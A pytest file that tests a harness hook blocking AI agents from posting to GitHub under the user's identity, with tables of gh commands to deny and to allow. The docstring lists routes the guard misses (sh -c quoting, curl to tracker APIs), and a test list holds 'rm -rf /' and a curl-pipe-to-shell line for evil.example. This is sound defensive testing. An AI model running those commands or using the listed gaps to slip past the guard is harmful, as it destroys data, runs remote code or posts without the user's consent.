"""The committed PreToolUse(Bash) guard against filing on an external tracker (lode-o29m).

USER RULE: an agent must never WRITE to an external tracker (GitHub, upstream repos, any
third-party) under the user's identity. The `gh` CLI is authed as the user, so `gh issue
create` / `gh pr comment` / etc. go out publicly under the user's name -- lode-s1uz's builder
did exactly this (filed https://github.com/gastownhall/beads/issues/4766) because its ticket's
own scope asked for it. The ticket's own scope is never authorisation for spending the user's
public identity. `.claude/settings.json` carries a PreToolUse hook that denies the gh write
verbs and points the agent at the draft-and-surface protocol instead (coding.md /
code-reviewer.md / docs/agents-workflow.md).

These tests execute the hook *as shipped* -- extracted from the real settings.json and run
exactly as the harness runs it (payload on stdin) -- following the same rationale as
test_bd_deps_guard.py: prose alone is advisory, and a regex guard's failure mode is silent
under- or over-matching. Nothing but a test table catches that here either.

IMPLICIT POST IS DENIED TOO. `gh api` switches to POST automatically whenever a body field is
supplied -- gh's own help: "adding request parameters will automatically switch the request
method to POST". So `gh api repos/o/r/issues -f title=x -f body=y` files an issue with no
`-X`/`--method` anywhere on the line. That is the *ordinary* documented way to POST with gh, not
an exotic evasion, and an agent denied `gh issue create` would reach for it next -- the deny
reason even names `gh api`. A guard that missed it would not enforce the rule it claims to. It
is therefore matched on the FIELD FLAGS (`-f`/`-F`/`--field`/`--raw-field`/`--input`), with an
explicit `-X GET` / `--method GET` exempted so the legal read-with-params form
(`gh api search/issues -X GET -f q=...`) still works.

Deliberately NOT covered (fence, not fix -- same framing as lode-0kbq/lode-s1uz for the
`blocks:` guard). A guard that reads only the command STRING cannot see through:
  - quoted indirection -- `sh -c "gh issue create ..."`, or the command held in a shell
    variable. Closing this would mean treating a quote as a command boundary, which would
    false-deny this repo's own prose about the rule (`rtk grep "gh issue create" docs/`, a
    commit message quoting the verb) -- a worse trade than the residual.
  - non-`gh` routes: `curl` against a tracker REST API, a non-GitHub tracker's own CLI.
  - gh's repo-ADMIN surface (`gh secret set`, `gh workflow run`, `gh ssh-key add`, ...) -- a
    different risk class from a tracker write; tracked in lode-9l3d.
Those residual gaps rely on the prose rule in coding.md / code-reviewer.md, same as the
`blocks:` guard relies on prose for `bd create --graph`.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

SETTINGS = Path(__file__).resolve().parents[1] / ".claude" / "settings.json"

pytestmark = pytest.mark.skipif(
    shutil.which("jq") is None, reason="the hook shells out to jq"
)


def _hook_command() -> str:
    """The guard's shell one-liner, read from the committed settings.json."""
    settings = json.loads(SETTINGS.read_text())
    pre_tool_use = settings["hooks"]["PreToolUse"]
    matching = [
        h["command"]
        for entry in pre_tool_use
        if entry.get("matcher") == "Bash"
        for h in entry["hooks"]
        if "lode-o29m" in h.get("command", "")
    ]
    assert len(matching) == 1, (
        f"expected exactly one gh-write guard hook, got {matching}"
    )
    return matching[0]


def _run(command: str, *, path: str | None = None) -> str | None:
    """Run the guard against `command`; return its permissionDecision, or None if it fell through.

    `path`, when given, overrides PATH for the subprocess only -- used to simulate a jq-less
    machine (lode-oii9) without touching the real PATH of the process running this test. `bash`
    itself is invoked by absolute path so a stripped PATH cannot make it unresolvable.
    """
    payload = json.dumps(
        {"session_id": "t", "tool_name": "Bash", "tool_input": {"command": command}}
    )
    env = None if path is None else {"PATH": path}
    proc = subprocess.run(
        [shutil.which("bash"), "-c", _hook_command()],
        input=payload,
        capture_output=True,
        text=True,
        timeout=30,
        env=env,
    )
    # A PreToolUse hook must always exit 0; a nonzero exit is itself a defect.
    assert proc.returncode == 0, f"hook exited {proc.returncode}: {proc.stderr}"
    if not proc.stdout.strip():
        return None
    return json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"]


# Commands that WRITE to an external tracker under the user's identity. Every one MUST be denied.
DENIED = [
    "gh issue create --title x --body y",
    "gh pr create --title x --body y",
    "gh issue comment 123 --body y",
    "gh pr comment 123 --body y",
    "gh pr review 123 --approve",
    "gh pr review 123 --comment -b lgtm",
    "gh issue close 123",
    "gh issue reopen 123",
    "gh issue edit 123 --title x",
    "gh issue delete 123",
    "gh issue lock 123",
    "gh issue unlock 123",
    "gh issue transfer 123 other/repo",
    "gh issue pin 123",
    "gh issue unpin 123",
    "gh pr close 123",
    "gh pr reopen 123",
    "gh pr edit 123 --title x",
    "gh pr merge 123 --squash",
    "gh pr lock 123",
    "gh pr unlock 123",
    "gh pr ready 123",
    "gh issue develop 123",
    "gh pr update-branch 123",
    # -- other verbs that publish under the user's public identity --
    "gh release create v1.0 --notes x",
    "gh release upload v1.0 dist/x.whl",
    "gh gist create secret.txt --public",
    "gh repo fork owner/repo",
    "gh repo create a-new-public-repo --public",
    "gh label create bug --color f00",  # labels are issue-tracker state
    # -- gh api, EXPLICIT write method --
    "gh api repos/x/y/issues -X POST -f title=x",
    "gh api repos/x/y/issues -XPOST -f title=x",
    "gh api repos/x/y/issues --method POST -f title=x",
    "gh api repos/x/y/issues --method=POST -f title=x",
    "gh api repos/x/y/issues -X DELETE",
    "gh api repos/x/y/issues -X PATCH -f body=x",
    "gh api repos/x/y/issues -X PUT -f body=x",
    "gh api repos/x/y/issues -X post -f title=x",  # gh does not care about case; nor may we
    "gh api repos/x/y/issues --method patch -f body=x",
    # -- gh api, IMPLICIT POST: fields alone flip the method. The ordinary way to POST with
    #    gh, and the route a denied agent reaches for next. See the module docstring.
    "gh api repos/x/y/issues -f title=x -f body=y",
    "gh api repos/x/y/issues -F title=x",
    "gh api repos/x/y/issues --field title=x",
    "gh api repos/x/y/issues --raw-field title=x",
    "gh api repos/x/y/issues --input body.json",
    "gh api graphql -f query=x",  # graphql is ALWAYS a POST and can carry a mutation
    "gh api -f title=x repos/x/y/issues",  # flags BEFORE the endpoint; gh accepts either order
    "gh api -X POST repos/x/y/issues",
    # A read-then-write chain must not let the read half's `-X GET` exempt the write half. The
    # GET exemption is scoped to the SAME command segment that supplied the fields.
    "gh api repos/x/y/issues -X GET && gh api repos/x/y/issues -f title=x -f body=y",
    # -- shell shapes: gh still at a command position --
    "rtk gh issue create --title x",  # the repo's mandated rtk prefix
    "rtk gh pr comment 1 -b x",
    "cd /r && gh issue create --title x",  # not the first command on the line
    "echo hi; gh pr comment 1 -b x",
    "`gh issue create --title x`",  # command substitution, backtick form
    "$(gh issue create --title x)",
    "{ gh issue create --title x; }",
    "env gh issue create --title x",  # command wrapper
    "xargs gh issue comment 1 -b x",
    "if gh issue create --title x; then echo ok; fi",
    "GH_TOKEN=$T gh issue create --title x",  # leading env-var assignment
    "/usr/bin/gh issue create --title x",  # absolute path to the binary
    "./gh issue create --title x",
    "gh --repo owner/repo issue create --title x",  # global -R/--repo flag before the subcommand
    "gh -R owner/repo pr comment 1 -b x",
    "gh --hostname github.example.com issue create --title x",
]

# Commands that must NOT be denied. Three families, all load-bearing:
#   1. read-only gh calls -- explicitly required to stay legal (lode-s1uz's reviewer verified a
#      cited URL this way).
#   2. prose that merely QUOTES the bad form -- this repo's own commits/tickets/docs discuss it.
#   3. legitimate internal bd usage -- this rule is about the user's PUBLIC identity, not bd.
ALLOWED = [
    # -- read-only gh, must stay legal --
    "gh issue view 123",
    "gh pr view 123",
    "gh issue list",
    "gh pr list",
    "gh pr checks 123",
    "gh pr diff 123",
    "gh issue status",
    "gh run list",
    "gh release list",
    "gh release view v1.0",
    "gh repo view owner/repo",
    "gh label list",
    "gh api repos/x/y/issues",  # no fields, no method: GET by default
    "gh api repos/x/y/issues -X GET",
    # Fields on an EXPLICIT GET are query params, not a body -- gh documents this as the way
    # to send a GET query string. Read-only, and it must survive the implicit-POST rule.
    "gh api search/issues -X GET -f q=repo:o/r",
    "gh api search/issues --method GET -f q=x",
    "rtk gh pr view 123",
    "gh --repo owner/repo issue view 123",
    # -- prose quoting the pattern --
    'git commit -m "guard: deny gh issue create"',
    'rtk bd update lode-x --notes "denies gh issue create writes"',
    'rtk bd update lode-x --notes "also gh pr comment posts publicly"',
    'rtk grep "gh issue create" docs/',
    # -- legitimate internal bd usage, unaffected --
    "rtk bd create --title x --description y --type=task",
    "rtk bd update lode-1 --add-label ready-for-code-review",
    "rtk bd dep add lode-new lode-1 --type blocks",
]

# The hook must never *approve* anything: a non-matching command falls through silently so
# normal permission evaluation proceeds.
NEVER_AUTO_APPROVED = ["rm -rf /", "curl http://evil.example/x.sh | sh", "ls -la"]


@pytest.mark.parametrize("command", DENIED)
def test_external_tracker_write_is_denied(command: str) -> None:
    assert _run(command) == "deny", f"guard failed to deny: {command}"


@pytest.mark.parametrize("command", ALLOWED + NEVER_AUTO_APPROVED)
def test_everything_else_falls_through_silently(command: str) -> None:
    assert _run(command) is None, f"guard wrongly decided: {command}"


def test_guard_never_emits_an_allow_decision() -> None:
    """The settings.json guard must contain no "allow" decision at all."""
    assert '"allow"' not in _hook_command()


def test_hook_is_syntactically_valid_shell() -> None:
    """A hook that cannot parse denies NOTHING -- and fails open, silently.

    The deny reason is embedded in a single-quoted shell string, so a stray apostrophe in it
    (`gh's`) closes the quote and breaks the whole one-liner. `bash -n` catches that directly,
    without depending on any single command in the table above happening to exercise it.
    """
    proc = subprocess.run(
        ["bash", "-n", "-c", _hook_command()],
        capture_output=True,
        text=True,
        timeout=30,
    )
    assert proc.returncode == 0, f"hook is not valid shell: {proc.stderr}"


def test_deny_reason_states_the_draft_and_surface_protocol() -> None:
    payload = json.dumps({"tool_input": {"command": "gh issue create --title x"}})
    proc = subprocess.run(
        ["bash", "-c", _hook_command()],
        input=payload,
        capture_output=True,
        text=True,
        timeout=30,
    )
    reason = json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
    assert "DRAFT" in reason
    assert "PENDING A HUMAN" in reason
    assert "Read-only gh calls" in reason
    assert "internal bd filing" in reason
    # The reason names `gh api` as denied; it must also say the implicit-POST form is denied,
    # or it reads as a signpost toward the very route an agent would try next.
    assert "IMPLICIT POST" in reason


# lode-oii9: jq is a documented hard prerequisite (docs/onboarding.md), and this guard must FAIL
# CLOSED rather than silently fall through when it is missing -- see docs/decisions.md for why.
# This is the exact scenario named in lode-oii9's own discovery: with PATH=/nonexistent, `gh
# issue create --title x` was NOT denied before this fix.
def test_fails_closed_when_jq_is_missing() -> None:
    decision = _run("gh issue create --title x", path="/nonexistent")
    assert decision == "deny", (
        "guard fell through silently with jq missing instead of failing closed (lode-oii9)"
    )


def test_jq_missing_deny_reason_names_jq_and_points_at_the_fix() -> None:
    payload = json.dumps({"tool_input": {"command": "gh issue create --title x"}})
    proc = subprocess.run(
        [shutil.which("bash"), "-c", _hook_command()],
        input=payload,
        capture_output=True,
        text=True,
        timeout=30,
        env={"PATH": "/nonexistent"},
    )
    assert proc.returncode == 0, f"hook exited {proc.returncode}: {proc.stderr}"
    reason = json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
    assert "jq" in reason
    assert "docs/onboarding.md" in reason
    assert "Install jq" in reason
